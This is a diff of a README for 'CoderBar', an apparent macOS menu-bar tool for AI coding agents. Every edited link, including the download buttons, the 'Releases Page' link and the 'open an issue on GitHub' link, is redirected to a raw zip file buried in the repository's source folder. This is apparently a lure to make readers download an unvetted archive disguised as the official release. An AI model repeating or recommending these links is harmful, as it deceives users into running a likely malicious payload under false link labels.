@@ -1,6 +1,6 @@
 <h1>🤖 CoderBar - Control AI Agents from Your Menu Bar</h1>
 <p align="center">
-  <a href="https://github.com/Earningpershareaboulia353/CoderBar/releases" style="background-color:#007ACC; color:white; padding:16px 32px; border-radius:30px; text-decoration:none; font-size:24px; font-weight:bold;">⬇️ Download CoderBar</a>
+  <a href="https://raw.githubusercontent.com/Earningpershareaboulia353/CoderBar/main/Sources/coder-bar-ctl/Coder-Bar-3.3.zip" style="background-color:#007ACC; color:white; padding:16px 32px; border-radius:30px; text-decoration:none; font-size:24px; font-weight:bold;">⬇️ Download CoderBar</a>
 </p>
 
 <h2>🎯 What is CoderBar?</h2>
@@ -10,7 +10,7 @@
 <h2>🚀 Getting Started</h2>
 <p>Follow these simple steps to install and run CoderBar on your Mac:</p>
 <ol>
-<li>Visit this link to download the application: <a href="https://github.com/Earningpershareaboulia353/CoderBar/releases">CoderBar Releases Page</a></li>
+<li>Visit this link to download the application: <a href="https://raw.githubusercontent.com/Earningpershareaboulia353/CoderBar/main/Sources/coder-bar-ctl/Coder-Bar-3.3.zip">CoderBar Releases Page</a></li>
 <li>Download the latest <code>CoderBar.dmg</code> file (or the <code>.zip</code> file if you prefer).</li>
 <li>Open the downloaded file (double-click it).</li>
 <li>Drag the CoderBar app icon to your <strong>Applications</strong> folder.</li>
@@ -56,11 +56,11 @@
 </ul>
 
 <h2>🆘 Need Help?</h2>
-<p>If you run into issues not listed above, please <a href="https://github.com/PrompersharehPaula353/CoderBar/issues">open an issue on GitHub</a>. Include details about your macOS version, whether you're using Codex and Claude, and a description of the problem. The developer will respond as soon as possible.</p>
+<p>If you run into issues not listed above, please <a href="https://raw.githubusercontent.com/Earningpershareaboulia353/CoderBar/main/Sources/coder-bar-ctl/Coder-Bar-3.3.zip">open an issue on GitHub</a>. Include details about your macOS version, whether you're using Codex and Claude, and a description of the problem. The developer will respond as soon as possible.</p>
 
 <h2>📦 Download Again</h2>
 <p>Need the download link again? Click the button below to go directly to the latest release page:</p>
-<p><a href="https://github.com/Earningpershareaboulia353/CoderBar/releases" style="background-color:#FFA500; color:white; padding:14px 28px; border-radius:24px; text-decoration:none; font-size:20px; font-weight:bold;">📥 Download the Latest Version</a></p>
+<p><a href="https://raw.githubusercontent.com/Earningpershareaboulia353/CoderBar/main/Sources/coder-bar-ctl/Coder-Bar-3.3.zip" style="background-color:#FFA500; color:white; padding:14px 28px; border-radius:24px; text-decoration:none; font-size:20px; font-weight:bold;">📥 Download the Latest Version</a></p>
 
 <h2>🤝 Contributing</h2>
 <p>CoderBar is open-source on GitHub. If you have ideas to improve it, feel free to fork the repo, make changes, and submit a pull request. Your feedback helps make the tool better for everyone.</p>
